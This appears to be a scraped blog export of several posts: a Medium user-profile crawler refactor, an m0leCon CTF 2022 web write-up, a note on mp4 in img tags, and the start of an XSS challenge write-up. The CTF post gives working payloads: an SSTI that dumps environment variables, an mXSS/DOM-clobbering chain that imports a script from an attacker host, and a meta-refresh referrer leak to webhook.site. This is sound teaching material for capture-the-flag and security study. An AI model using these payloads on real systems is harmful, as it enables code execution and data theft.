Crawler Version 4: RefactoringWhen I opened the database, I found that there were still many Japanese users. The reason was that some of them had kanji nicknames and no self-introduction, or only a few words in their self-introduction, so they were still considered Chinese users. In the end, the unreliable judgment mechanism was the root cause of the problem. Since things had come to this point, I couldn’t be lazy anymore. I had to implement the more accurate solution I mentioned earlier: “Check if the recently published or clapped articles are in Chinese.” Fortunately, the API provided this data, and it was much easier to implement than I thought. In addition to this, because the queue was growing much faster than it was being consumed, I changed the method. I wrote another small program that removed the “add followers to the queue” step from the original process and fetched 10 user data at a time. In other words, this new program simply kept fetching user data and storing it in the database, so the queue would become smaller and the user data would accumulate. It could fetch 20,000 data in an hour, and the queue could be cleared in half a day. The advantage was that I could quickly accumulate user data. The original implementation was too slow, and I could only fetch about 10,000 data a day. The new implementation didn’t need to add things to the queue, so the user data grew quickly. At that time, I copied and modified the code to create the new program, which made the code more and more messy. Considering that I wanted to open source it later, it was time to clean up the code, so I refactored the program. The refactored architecture is as follows: . ├── README.md &#x2F;&#x2F; 說明 ├── app.js &#x2F;&#x2F; 主程式 ├── getUsers.js &#x2F;&#x2F; 只抓使用者資料的小程式 ├── config.js &#x2F;&#x2F; 設定檔 ├── db.js &#x2F;&#x2F; 資料庫相關 ├── medium.js &#x2F;&#x2F; medium API 相關 ├── package.json ├── queue.js └── utils.js Let’s start with config: module.exports = &#123; db: &#123; connectionLimit: 10, host : '', user : '', password : '', database : 'medium', charset: 'utf8mb4' &#125;, batchLimit: 1, // 一次抓多少筆使用者資料 randomDelay: function() &#123; return Math.floor(Math.random() * 200) + 100 &#125;, errorRateTolerance: 0.2, delayWhenError: 500 &#125; This is where the configuration files are stored, including the database settings and some parameters for fetching data, most of which are related to the program that fetches user data, such as how many data to fetch and how long to wait between each fetch. These are measures to avoid being blocked by sending too many requests. Next is utils.js: module.exports = &#123; // @see: https://stackoverflow.com/questions/44669073/regular-expression-to-match-and-split-on-chinese-comma-in-javascript/51941287#51941287 isChinese: (text = '') => &#123; const regex = /(\\p&#123;Script=Hani&#125;)+/gu; return text.match(regex) &#125;, // @see: https://gist.github.com/ryanmcgrath/982242 isJapanese: (text = '') => &#123; const regexJP = /[\\u3040-\\u309F]|[\\u30A0-\\u30FF]/g; const jp = text.match(regexJP) // more than 2 japanese char if (jp &amp;&amp; jp.length >= 2) &#123; return true &#125; return false &#125;, sleep: ms => new Promise(resolve => &#123; setTimeout(resolve, ms) &#125;), log: function () &#123; const args = Array.prototype.slice.call(arguments); console.log.apply(console, args) &#125; &#125; This is where some functions used earlier are placed, including limiting the number of Japanese characters to two and wrapping console.log to make it easier to customize later. Then there’s medium.js, which is related to the medium API and adds a function isMandarinUser to check if the user is Chinese: const axios = require('axios') const _ = require('lodash') const utils = require('./utils') const JSON_HIJACKING_PREFIX = '])&#125;while(1);&lt;/x>' // wrapper function, return null instead of throwing error async function getMediumResponse(url) &#123; try &#123; const response = await axios.get(url) const json = JSON.parse(response.data.replace(JSON_HIJACKING_PREFIX, '')) return json &#125; catch(err) &#123; return null &#125; &#125; function isMandarinUser(name, bio, posts) &#123; // if bio or name is japanese, must be japanese if (utils.isJapanese(name) || utils.isJapanese(bio)) &#123; return false &#125; // this user has no activity on medium, decide by name and bio if (!posts) &#123; return utils.isChinese(name) || utils.isChinese(bio) &#125; const contents = _.values(posts).map(item => item.title + _.get(item, 'content.subtitle')) return Boolean( contents.find(item => &#123; return utils.isChinese(item) &amp;&amp; !utils.isJapanese(item) &#125;) ) &#125; module.exports = &#123; getFollowers: async (uid, to) => &#123; let url = `https://medium.com/_/api/users/$&#123;uid&#125;/profile/stream?source=followers&amp;limit=200` if (to) &#123; url += '&amp;to=' + to &#125; const json = await getMediumResponse(url) if (!json) &#123; return null &#125; const followers = _.keys(json.payload.references.Social) || [] const nextTo = _.get(json, 'payload.paging.next.to') return &#123; followers, nextTo &#125; &#125;, getUserInfo: async (uid) => &#123; const url = `https://medium.com/_/api/users/$&#123;uid&#125;/profile/stream` const json = await getMediumResponse(url) if (!json) &#123; return &#123;&#125; &#125; const userId = _.get(json, 'payload.user.userId') const follower = _.get(json, `payload.references.SocialStats.$&#123;userId&#125;.usersFollowedByCount`, 0) const posts = _.get(json, 'payload.references.Post') const name = _.get(json, 'payload.user.name') const bio = _.get(json, 'payload.user.bio') return &#123; isMandarinUser: isMandarinUser(name, bio, posts), userId, name, username: _.get(json, 'payload.user.username'), bio, followerCount: follower, mediumMemberAt: _.get(json, 'payload.user.mediumMemberAt'), isWriterProgramEnrolled: _.get(json, 'payload.user.isWriterProgramEnrolled'), createdAt: _.get(json, 'payload.user.createdAt'), &#125; &#125; &#125; isMandarinUser is determined based on three parameters: nickname, self-introduction, and related articles. Related articles may be the most recently published or clapped articles or replies, and the titles and subtitles of the articles are used to determine if they are in Chinese. If the user has no activity, the self-introduction and nickname are used to judge, so there is still a possibility of misjudgment, but the misjudgment rate is already quite low in practice. Next, let’s look at the database-related operations, db.js: const mysql = require('mysql') const moment = require('moment') function format(time) &#123; if (!time) return null return moment(time).format('YYYY-MM-DD HH:mm:ss') &#125; function transform(info) &#123; return [ info.userId, info.username, info.name, info.bio, info.followerCount, format(info.mediumMemberAt), format(info.createdAt), info.isWriterProgramEnrolled, null ] &#125; class DB &#123; constructor(config) &#123; this.conn = mysql.createPool(config) &#125; getExistingUserIds() &#123; return new Promise((resolve, reject) => &#123; this.conn.query('SELECT userId from Users', (err, results) => &#123; if (err) &#123; return reject(err) &#125; return resolve(results.map(item => item.userId)) &#125;); &#125;) &#125; getUserIds(limit) &#123; return new Promise((resolve, reject) => &#123; this.conn.query('SELECT userId from Users where fr=\"TW\" order by follower desc limit ' + limit, (err, results) => &#123; if (err) &#123; return reject(err) &#125; return resolve(results.map(item => item.userId)) &#125;); &#125;) &#125; deleteUserIds(userIds) &#123; return new Promise((resolve, reject) => &#123; this.conn.query('DELETE from Queues WHERE userId IN (?)', [userIds], (err, results) => &#123; if (err) &#123; return reject(err) &#125; return resolve(userIds) &#125;) &#125;) &#125; insertUserData(info) &#123; if (!info) return const data = Array.isArray(info) ? info.map(transform) : [transform(info)] this.conn.query(` INSERT INTO Users ( userId, username, name, bio, follower, mediumMemberAt, createdAt, isWriterProgramEnrolled, fr ) VALUES ?`, [data], (err) => &#123; if (err) &#123; // console.log(err) &#125; &#125; ) &#125; insertIntoQueue(list) &#123; return new Promise((resolve, reject) => &#123; const values = [] for (let item of list) &#123; values.push([item]) &#125; this.conn.query(` INSERT IGNORE INTO Queues (userId) VALUES ?`, [values], (err) => &#123; if (err) &#123; // console.log(err) &#125; resolve() &#125; ) &#125;) &#125; &#125; module.exports = DB Basically, a bunch of SQL queries are wrapped into Promises and functions to make it easier for other modules to use. Most functions can accept an array for batch operations, which is more efficient. And after packaging these things, the code for the queue becomes very simple: class Queue &#123; constructor(db) &#123; this.db = db &#125; async get(limit) &#123; const items = await this.db.getUserIds(limit) await this.db.deleteUserIds(items) return items &#125; async push(list) &#123; await this.db.insertIntoQueue(list) &#125; &#125; module.exports = Queue Finally, let’s take a look at our main program app.js. After refactoring, the code becomes much cleaner and more readable: const DB = require('./db') const Queue = require('./queue') const config = require('./config') const medium = require('./medium') const utils = require('./utils') async function main() &#123; const db = new DB(config.db) const queue = new Queue(db) const existingUserIds = await db.getExistingUserIds() const userIdMap = &#123;&#125; for (let userId of existingUserIds) &#123; userIdMap[userId] = true &#125; utils.log('Existing userId:', existingUserIds.length) while(true) &#123; const userIds = await queue.get(1) if (userIds.length === 0) &#123; utils.log('Done') break &#125; const userId = userIds[0] if (userIdMap[userId]) &#123; continue &#125; userIdMap[userId] = true utils.log('userId:', userId) try &#123; const userInfo = await medium.getUserInfo(userId) if (!userInfo.userId) &#123; utils.log('getUerrInfo error, sleep for', config.delayWhenError) await utils.sleep(config.delayWhenError) &#125; if (!userInfo.isMandarinUser) &#123; utils.log(userId, 'not MandarinUser') continue &#125; db.insertUserData(userInfo) if (userInfo.followerCount > 0) &#123; let to = undefined let count = 0 while (true) &#123; const data = await medium.getFollowers(userInfo.userId, to) if (!data) &#123; break &#125; const &#123; nextTo, followers &#125; = data to = nextTo count += followers.length utils.log(userInfo.userId, 'fetching', count, 'followers') await queue.push(followers.filter(uid => !userIdMap[uid])) if (followers.length === 0 || !to) &#123; break &#125; &#125; &#125; &#125; catch (err) &#123; utils.log('sleep for', config.delayWhenError) utils.log(err) await utils.sleep(config.delayWhenError) &#125; &#125; process.exit() &#125; main() There is a mechanism here that is different from before. Previously, every time a userId was taken from the queue, it was checked in the database whether it had been crawled. But this is too inefficient. In this version, the program directly retrieves all data from the database when it is executed, and becomes a map. If there is a value, it means that it has been crawled, and vice versa. The refactored code looks much better after the module is split, and it is easy to make changes. If it hadn’t been refactored, I wouldn’t dare to open source it… Here is the refactored code: https://github.com/aszx87410/medium-user-crawler SummaryThere were many pitfalls in the process of writing the crawler, and the most troublesome one was the language detection part. I didn’t think about the case of Japanese characters at first, and it took a lot of time. Laziness also took a lot of time. Originally, I didn’t want to use a more accurate method to do the judgment, but in the end, I had to use it, wasting a lot of time in the middle. There are many places where this crawler can be improved, such as the execution speed or the language detection part. Currently, after I retrieve the data, I manually mark whether it is Hong Kong, Taiwan, or China, but perhaps a small program can be written to automatically determine it. For example, simplified Chinese is China, and if there are some Cantonese characters, it is Hong Kong, and vice versa. Although it may not be accurate, using a program to assist will be much more convenient. This article mainly shares my experience in writing this crawler. As long as the data source can be determined to be retrievable, everything else is not a big problem. Plus, this crawler is not very complete (for example, there is no retry mechanism), so it can be implemented in a day or two. I hope this article has attracted everyone’s attention, and I also hope that everyone can try to crawl data and make interesting data analysis!","link":"/2019/07/12/en/medium-crawler/"},{"title":"m0leCon CTF 2022 Notes","text":"I originally planned to write a more detailed post, but I realized that it might take a long time to publish. So I decided to write a brief version first. I solved the following four web challenges: Fancy Notes Dumb Forum LESN ptMD Here are some keywords that might be helpful for future reference: Length extension attack SSTI Mutation XSS &lt;svg&gt;&lt;style&gt; &lt;meta name=&quot;referrer&quot; content=&quot;unsafe-url&quot; /&gt; &lt;meta http-equiv=&quot;refresh&quot; content=&quot;3;url&quot;&gt; Puppeteer’s click behavior is to capture the element position and then click the coordinates. Fancy NotesThe core code of this challenge is as follows: def get_user(): if not 'user' in request.cookies: return None cookie = base64.b64decode(request.cookies.get( 'user')).decode('raw_unicode_escape') assert len(cookie.split('|')) == 2 user_string = cookie.split('|')[0] signature_string = cookie.split('|')[1] if hashlib.sha256((SECRET_KEY + user_string).encode('raw_unicode_escape')).hexdigest() != signature_string: print(\"nope\") return None user = serialize_user(user_string) return user The code below is used to serialize and deserialize the user information based on the cookie: def serialize_user(user_string): user = dict() for kv in user_string.split(','): k = kv.split('=')[0] v = kv.split('=')[1] user[k] = v return user def deserialize_user(user): values = [] for k in [\"username\", \"locale\"]: values.append(f'&#123;k&#125;=&#123;user.__dict__[k]&#125;') return ','.join(values) The code below is used to generate the cookie: def generate_cookie(user): user_string = deserialize_user(user) signature_string = hashlib.sha256( (SECRET_KEY + user_string).encode('raw_unicode_escape')).hexdigest() cookie = base64.b64encode( (f'&#123;user_string&#125;|&#123;signature_string&#125;').encode('raw_unicode_escape')).decode() return cookie The goal is to forge a cookie to log in as an admin and obtain the flag. Under normal circumstances, assuming our user is named “abc” and the locale is “en”, the generated user_string will be: username=abc,locale=en. From serialize_user, we can see that the earlier attributes will be overwritten by the later ones. Therefore, if our user_string is username=a,locale=en,username=admin, when it is restored to a user, the identity will become admin. When generating the cookie, a signature (sha256(secret + user_string)) is added to verify the data integrity. Therefore, in the absence of knowledge of the key, we should not be able to forge the user_string because the integrity check will fail. However, this challenge uses a verification method that can be attacked using a technique called length extension attack. Simply put, if there is an operation: M1 = hash(secret + data), you only need to know the “length” of secret+data, without knowing what the content is, and the resulting M1. Then, you can append any string after secret+data, and know the valid hash(secret + data + padding + any data). For example, if you know that &quot;&#123;secret&#125;username=a&quot; will become 781e5e245d69b566979b86e28d23f2c7 after being hashed by md5, even if you do not know the secret, you can still know the md5 of &quot;&#123;secret&#125;username=a&#123;padding&#125;,username=admin&quot;. The &#123;padding&#125; above is related to the principle of hash algorithm. In short, through this attack method, we can extend the known string and generate a valid hash value without knowing the secret, and bypass the check of this challenge. As for the detailed principles and attack methods, I will leave a few reference articles here, and I may come back to fill this gap in the future: Everything you need to know about hash length extension attacks Length Extension Attack (LEA) Hash Length Extension Attacks Understanding the length extension attack Merkle–Damgård structure and length extension attack Hash Length Extension Attacks Length extension attack Dumb ForumThere is an SSTI in this question: @app.route('/profile', methods=['GET', 'POST']) @login_required def profile(): with open('app/templates/profile.html') as p: profile_html = p.read() profile_html = profile_html % (current_user.username, current_user.email, current_user.about_me) if(current_user.about_me == None): current_user.about_me = \"\" return render_template_string(profile_html) Both the username and aboutme are checked and cannot use &#125;&#123;, while email is only checked if it is a valid email address, and if so, it can be used. Therefore, abc｛&#123;7*7&#125;&#125;@abc.com will be displayed as abc49@abc.com on the interface because in this library, if an email address has () it will be considered invalid, so () cannot be used. The flag is in the environment variable, so just do this to win: &#123;&#123;cycler.__init__.__globals__.os.environ&#125;&#125;@x.com LESNIn this question, you can create a post, the content of which can be controlled but will be sanitized, and finally rendered like this: &lt;script src=\"/static/script.js\" async>&lt;/script> &lt;a style=\"position: absolute; left: 30%; top:5px\" href=\"/\">Home&lt;/a> &lt;a style=\"position: absolute; right: 30%; top:5px\" href=\"/edit/&lt;%= imgid %>\">Edit&lt;/a> &lt;div style=\"margin-top: 3em;\"> &lt;img src=\"&lt;%= imgurl %>\" onerror=\"setTimeout(redirect_error_image,1500)\" style=\"max-height: 300px; max-width: 300px; display:block; margin: auto; border: 2px solid #555;\"> &lt;div style=\"margin-top: 30px; text-align: center;\">&lt;%- description %>&lt;/div> &lt;/div> &lt;%- include('footer') %> The filtering code looks like this: const createDOMPurify = require('dompurify'); const &#123; JSDOM &#125; = require('jsdom'); const window = new JSDOM('').window; const DOMPurify = createDOMPurify(window); function my_sanitize(html) &#123; const document = new JSDOM('').window.document document.body.outerHTML = html let node; const iter = document.createNodeIterator(document.body) while (node = iter.nextNode()) &#123; if (/(script|iframe|frame|object|data|m.+)/i.test(node.nodeName)) &#123; node.parentNode.removeChild(node) continue &#125; if (node.attributes) &#123; for (let i = node.attributes.length - 1; i >= 0; i--) &#123; const att = node.attributes[i] if (! /(class|src|style)/i.test(att.name)) &#123; node.removeAttributeNode(att) &#125; &#125; &#125; &#125; return document.body.innerHTML &#125; function sanitize(html) &#123; let clean = my_sanitize(html) clean = DOMPurify.sanitize(clean) return clean &#125; module.exports = &#123; sanitize &#125; Finally, it has been passed through DOMPurify, so dangerous tags cannot be used. The key point of this question is that when I was looking at it, I found that sometimes the console would display an error message of redirect_error_image is undefined. This is because the script is loaded using async, so there is a race condition problem. If the onerror of the img is triggered before the script is loaded, then redirect_error_image will be undefined. Using this feature, the winning formula is to use DOM clobbering to control redirect_error_image, and then use the setTimeout function to execute arbitrary code with the first parameter passed as a string, which is similar to the eval function. The part of DOM clobbering needs to bypass the custom parser first, which is completed by a teammate. The principle is roughly described in this article: HTML sanitization bypass in Ruby Sanitize &lt; 5.2.1, using namespace confusion to create mXSS, and the payload looks like this: &lt;svg>&lt;style>&lt;&amp;sol;style>&lt;&amp;sol;svg>&amp;lt;a id=redirect_error_image href=http:pew>g jsdom will parse the above paragraph into this: BODY -&gt; svg ---&gt; style ------&gt; #text: &lt;&#x2F;style&gt;&lt;&#x2F;svg&gt;&lt;a id&#x3D;redirect_error_image href&#x3D;http:pew&gt;g It is just a style with content, nothing special, but when restored to document.body.innerHTML, it becomes like this: &lt;svg>&lt;style>&lt;/style>&lt;/svg>&lt;a id=redirect_error_image href=http:pew>g&lt;/style>&lt;/svg> Then this &lt;a&gt; tag is generated, allowing us to perform DOM clobbering. The content can be simply put http:import(script), where http: is treated as a label, and the following code will be executed directly. The next step is how to make onerror happen faster than the script is loaded. According to the author’s writeup, you can put a URL like http://localhost in the image URL to make it fail quickly, and http://not_exist should work too. Then you can use an iframe to load your post and then send the custom page to the bot to avoid using the cached script.js. At that time, I thought that the browser had priority when loading resources. If I could create a combination with a higher priority than script.js, I could delay the loading of the script. So I tried to add a lot of pictures to the page: &lt;svg>&lt;style>&lt;&amp;sol;style>&lt;&amp;sol;svg>&amp;lt;a id=redirect_error_image href=mailto:import('//vps/exploit.js')> &amp;lt;img src=https://deelay.me/20000/https://example.com> &amp;lt;img src=https://deelay.me/20001/https://example.com> &amp;lt;img src=https://deelay.me/20002/https://example.com> &amp;lt;img src=https://deelay.me/20003/https://example.com> But it seems to be useless, and the order of the pictures should not be higher than the script. At that time, I did not continue to study what could achieve the ideal situation I wanted. Finally, I thought of when @lbrnli1234 was solving an XSS question I gave before, he also encountered a race condition and then added a lot of iframes to increase the success rate. See: Notes XSS Challenge Author Writeup I did the same thing and stuffed a bunch of iframes: &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;/head> &lt;body> &lt;iframe src=\"https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38\">&lt;/iframe> &lt;iframe src=\"https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38\">&lt;/iframe> &lt;iframe src=\"https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38\">&lt;/iframe> &lt;iframe src=\"https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38\">&lt;/iframe> &lt;iframe src=\"https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38\">&lt;/iframe> &lt;iframe src=\"https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38\">&lt;/iframe> &lt;iframe src=\"https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38\">&lt;/iframe> &lt;iframe src=\"https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38\">&lt;/iframe> &lt;iframe src=\"https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38\">&lt;/iframe> &lt;iframe src=\"https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38\">&lt;/iframe> &lt;/body> &lt;/html> Finally, I solved it. First blood. ptMDThis was the hardest challenge, only 1 solve. First, here’s the author’s writeup: https://github.com/xatophi/m0leconteaser2022-ptMD/blob/main/writeup.md In short, you have a page where you can insert any HTML, but the CSP is script-src &#39;self&#39;, so you can’t XSS. The goal is to steal the contents of the admin note. Since the URL is unique and there is no permission management, stealing the URL is enough. On the client’s page, there is a last button that takes you to the latest note page. Since this was done using React, setting the URL to /last directly doesn’t work because the notes are empty when first loaded, so it doesn’t redirect to the latest note. This is what the admin bot looks like: async function visit(url) &#123; const browser = await puppeteer.launch(&#123; headless: true, args: [ '--disable-default-apps', '--disable-extensions', '--disable-gpu', '--disable-sync', '--disable-translate', '--hide-scrollbars', '--metrics-recording-only', '--mute-audio', '--no-first-run', '--no-sandbox', '--safebrowsing-disable-auto-update' ], executablePath: '/usr/bin/chromium' &#125;) try &#123; let page = await browser.newPage() //login await page.goto(LOGIN_URL) await page.waitForSelector('#username') await page.focus('#username') await page.keyboard.type('admin', &#123; delay: 10 &#125;) await page.focus('#password') await page.keyboard.type(ADMIN_PASSWORD, &#123; delay: 10 &#125;) await new Promise(resolve => setTimeout(resolve, 300)) await page.click('#submit') await new Promise(resolve => setTimeout(resolve, 300)) //await page.waitForNavigation(&#123; waitUntil: 'networkidle2' &#125;) console.log(await page.cookies()) // visit URL after auth await page.goto(url, &#123; timeout: 5000 &#125;) await new Promise(resolve => setTimeout(resolve, 2000)) // logout await page.click('#logout') await new Promise(resolve => setTimeout(resolve, 2000)) // close browser await page.close() await browser.close() &#125; catch (e) &#123; console.log(e) await browser.close() //throw (e) &#125; &#125; The last step was strange to me when I was looking at it, which was clicking the logout button. I was wondering why I had to click that, but I found out later that it was also one of the keys. When I was solving it, I thought it might be related to the referrer policy, but using &lt;iframe referrerPolicy=&quot;unsafe-url&quot;&gt;&lt;/iframe&gt; didn’t seem to work. The answer is indeed related to this, but it’s like this: &lt;meta name=\"referrer\" content=\"unsafe-url\" /> &lt;meta http-equiv=\"refresh\" content=\"3;url=https://webhook.site/d485f13a-fd8b-4cfd-ad13-63d9b0f1f5ef\" /> Use &lt;meta&gt; to set the referrer, and then use meta refresh to redirect the page after three seconds. Then, use CSS to hide the logout button behind the last button, so the admin bot will actually click the last button, jump to the note page, and then leak the URL based on the referrer policy. Finally, this answer broke three things I thought I knew: I thought meta had to be in the head to be effective. I thought the meta tag would be ineffective after being cleared. I thought that when puppeteer clicks a button, it is not related to the screen, but directly clicks the element. For these three things, we can do a little experiment. For the first point, I made a simple webpage: &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset='utf-8'> &lt;/head> &lt;body> &lt;h1>test&lt;/h1> &lt;meta name=\"referrer\" content=\"unsafe-url\" /> &lt;meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'; img-src https://*; child-src 'none';\"> &lt;meta http-equiv=\"refresh\" content=\"3;url=http://example.org\" /> &lt;/body> &lt;body> An error is seen in the console: The Content Security Policy ‘default-src ‘self’; img-src https:&#x2F;&#x2F;*; child-src ‘none’;’ was delivered via a element outside the document’s , which is disallowed. The policy has been ignored. However, after three seconds, it does redirect. So only the CSP header must be in the head, and the others can be in the body. For the second point, just modify the webpage: &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset='utf-8'> &lt;/head> &lt;body> &lt;h1>test&lt;/h1> &lt;meta name=\"referrer\" content=\"unsafe-url\" /> &lt;meta http-equiv=\"refresh\" content=\"3;url=http://example.org\" /> &lt;script> [...document.querySelectorAll('meta')].forEach(item => item.remove()) alert(document.body.innerHTML) &lt;/script> &lt;/body> &lt;body> Although the meta tag is indeed removed, it still redirects after 3 seconds, so the effect is still there. It’s really that magical. For the third point, the document states page.click(selector[, options]) This method fetches an element with selector, scrolls it into view if needed, and then uses page.mouse to click in the center of the element. If there’s no element matching selector, the method throws an error. If you look at the source code, you can see: src&#x2F;common&#x2F;JSHandle.ts /** * This method scrolls element into view if needed, and then * uses &#123;@link Page.mouse&#125; to click in the center of the element. * If the element is detached from DOM, the method throws an error. */ async click(options: ClickOptions = &#123;&#125;): Promise&lt;void> &#123; await this._scrollIntoViewIfNeeded(); const &#123; x, y &#125; = await this.clickablePoint(options.offset); await this._page.mouse.click(x, y, options); &#125; Here, we are simply using _page.mouse.click to click on a specified coordinate. Therefore, if there is an element covering it, it will click on the element that is on top. I have learned a lot.","link":"/2022/05/21/en/m0lecon-ctf-2022-writeup/"},{"title":"TIL:img src also supports mp4 (Safari only)","text":"Some websites use GIFs for certain images because they are animated and appear more impressive than static images. Sometimes, the need for an animated image arises, such as in the case of stickers where animation is expected. However, one of the well-known drawbacks of GIFs is their large file size. Especially on mobile devices with higher resolutions, larger images are required. Even if only a 52px image is displayed, a 156px image needs to be prepared, resulting in increased file size. In terms of web development, it is always better to have fewer and smaller resources to load. Therefore, many websites have started using the &lt;video&gt; tag to display these animated images. By converting them to the mp4 format, the file size can be significantly reduced. However, there are some downsides to using the &lt;video&gt; tag instead of &lt;img&gt;, such as the lack of native support for lazy loading and other inconveniences. During my research, I unexpectedly discovered that Safari actually supports mp4 in the &lt;img&gt; tag! This means you can do the following: &lt;img src=\"test.mp4\"> This feature has been available since 2017: Bug 176825 - [Cocoa] Add an ImageDecoder subclass backed by AVFoundation I found out about this in the following article: Evolution of &lt;img&gt;: Gif without the GIF If &lt;img&gt; can also support mp4, we can take advantage of the benefits of both tags without having to switch tags. We can have lazy loading support and significantly reduce the file size. Unfortunately, this feature is only supported in Safari. Even after six years, I haven’t seen this functionality in Chromium or Firefox, and it seems unlikely to be implemented in the future. Chromium has explicitly stated that it will not support this feature. The discussion thread can be found here: Issue 791658: Support &lt;img src&#x3D;”*.mp4”&gt;. It was marked as “Wont fix” in 2018, with the following reason: Closing as WontFix per c#35, due to the following: - The widespread adoption of WebP (addresses CDN use case) - Forthcoming AV1 based image formats (ditto). - Memory inefficiency with allowing arbitrary video in image. - Most sites have already switched to &lt;video muted&gt; now that autoplay is allowed. The first point mentioned that WebP actually has an Animated WebP format that can be used within the &lt;img src&gt; tag and is also animated. It has even smaller file sizes. For more information on the pros and cons, you can refer to Google’s own documentation: What are the benefits of using animated WebP? The second point mentions that the newer image format AVIF also has Animated AVIF, which also supports animated images. If these new image formats can replace GIFs, it seems that there is no real need to use mp4. As for Firefox, although they haven’t explicitly stated that they won’t implement this feature, the issue hasn’t seen much activity for a long time: Add support for video formats in &lt;img&gt;, behaving like animated gif Some people hope to add this feature to the specification, but there hasn’t been much progress for a while: Require img to be able to load the same video formats as video supports #7141 In conclusion, it seems that this feature will only be available in Safari. Unfortunately, the image service I am using only supports converting GIFs to mp4 and does not support converting to animated WebP or animated AVIF, which would have been very convenient. SummaryIf you want to continue using &lt;img&gt; for animated images, the most comprehensive approach would be to use the &lt;picture&gt; tag with multiple file formats, like this: &lt;picture> &lt;source type=\"image/avif\" srcset=\"test.avif\"> &lt;source type=\"video/mp4\" srcset=\"test.mp4\"> &lt;source type=\"image/webp\" srcset=\"test.webp\"> &lt;img src=\"test.gif\"> &lt;/picture> This ensures that the results are displayed correctly on every browser and selects the image with usually smaller file size. I tried it out myself with a simple gif that had an original size of 75 KB: After converting it to WebP, it became 58 KB (-22.6%): Converting it to mp4 reduced the size to 17 KB (-77.3%): Converting it to AVIF reduced the size to 11 KB (-85.3%): It seems that the latest file formats are quite impressive, reducing the size significantly.","link":"/2023/09/11/en/mp4-in-img-src/"},{"title":"Notes XSS Challenge Author Writeup","text":"Last month, I created an XSS challenge and hosted it on my GitHub: https://aszx87410.github.io/xss-challenge/notes/ This is the writeup about the challenge and solutions, including intended and unintended. I will start from the intended one. OverviewLet’s look at the challenge, it’s a simple but compacted app with ~100 lines JS and not-so-strict CSP: &lt;meta http-equiv=\"Content-Security-Policy\" content=\" default-src 'self'; script-src 'self' https://www.gstatic.com/ https://www.google.com/ https://cdnjs.cloudflare.com/ajax/libs/dompurify/; frame-src https://www.google.com/ https://recaptcha.google.com/; style-src 'self' 'unsafe-inline'; \"> app.js: String.prototype.encode = function(type) &#123; if (!type) return this if (type === 'uri') return encodeURIComponent(this) if (type === 'json') return JSON.stringify(this) if (type === 'base64') return atob(this) &#125; const inputContent = document.querySelector('#input-content') const renderer = document.querySelector('#renderer') document.querySelector('#clear').onclick = function(e) &#123; e.preventDefault() inputContent.value = \"\" &#125; document.querySelector('#reload').onclick = function(e) &#123; e.preventDefault() reloadRecaptchaScript(0) document.querySelector('#reload').style = \"display:none\" &#125; function onSubmit() &#123; const content = inputContent.value const name = document.querySelector('input[name=creator]').value const qs = 'name=' + name.encode('uri') + '&amp;content=' + content.encode('uri') window.location.search = '?' + qs &#125; function loadScript(src) &#123; const script = document.createElement('script'); script.async = true; script.src = src; if (script.src.includes('jsonp') || decodeURIComponent(script.src).includes('jsonp')) &#123; throw new Error('dangerous keyword detected') &#125; document.body.appendChild(script); &#125; function reloadRecaptchaScript(index) &#123; // delay for a bit to not block main thread setTimeout(() => &#123; console.log('reload', index, document.scripts[index]) const element = document.scripts[index] const src = element.getAttribute('src') if (!src.startsWith('https://www.google.com/recaptcha/')) &#123; throw new Error('reload failed, invalid src') &#125; element.parentNode.removeChild(element) loadScript(src) &#125;, 1000) &#125; function sanitize(html, options = defaultOptions) &#123; return DOMPurify.sanitize(html, &#123; FORBID_TAGS: options.blockTags || [], FORBID_ATTR: options.blockAttrs || [], FORCE_BODY: options.forceBody, WHOLE_DOCUMENT: options.wholeDocument, KEEP_CONTENT: !options.removeContent, SANITIZE_DOM: !options.allowDOM, &#125;) &#125; function loadData(sanitizeOptions) &#123; const params = (new URL(document.location)).searchParams const name = params.get('name') const content = params.get('content') if (!content) return // hide some elements, we don't need it document.querySelector('.title').innerText = 'Note' document.querySelector('.input-type').style = 'display: none'; document.querySelector('.input-date').style = 'display: none'; document.querySelector('.input-mode').style = 'display: none'; document.querySelector('#input-content').style = 'display: none'; document.querySelector('#submit').style = 'display: none'; document.querySelector('#clear').style = 'display: none'; document.querySelector('#reload').style = \"display:none\" document.querySelector('input[name=creator]').value = name const result = sanitize(content, sanitizeOptions) renderer.style = \"width:100%; min-height: 400px;display: block\" renderer.innerHTML = result &#125; loadData(&#123; blockTags: ['style', 'iframe', 'embed', 'input', 'svg', 'script', 'math', 'base', 'link'], blockAttrs: [], forceBody: false, wholeDocument: false, allowDOM: false, removeContent: true &#125;) When the app is loaded, in loadData function, it reads data from the URL and then renders it to innerHTML after sanitized, that’s all. For sanitizing, the config is pretty much the default one, so you can’t perform XSS directly unless you find a 0-day bypass: function sanitize(html, options = defaultOptions) &#123; return DOMPurify.sanitize(html, &#123; FORBID_TAGS: options.blockTags || [], FORBID_ATTR: options.blockAttrs || [], FORCE_BODY: options.forceBody, WHOLE_DOCUMENT: options.wholeDocument, KEEP_CONTENT: !options.removeContent, SANITIZE_DOM: !options.allowDOM, &#125;) &#125; loadData(&#123; blockTags: ['style', 'iframe', 'embed', 'input', 'svg', 'script', 'math', 'base', 'link'], blockAttrs: [], forceBody: false, wholeDocument: false, allowDOM: false, removeContent: true &#125;) What can we do by injecting a harmless HTML? Not much, unless you leverage another functionality. reCAPTCHA to the rescueSomehow, the challenge uses Google reCAPTCHA, and from their docs we know that we can trigger a function call by injecting the following HTML: &lt;div class=\"g-recaptcha\" data-sitekey=\"AAA\" data-error-callback=\"any_function_here\" data-size=\"invisible\"> &lt;/div> By providing a random wrong sitekey, reCAPTCHA will call the function in the attribute data-error-callback. 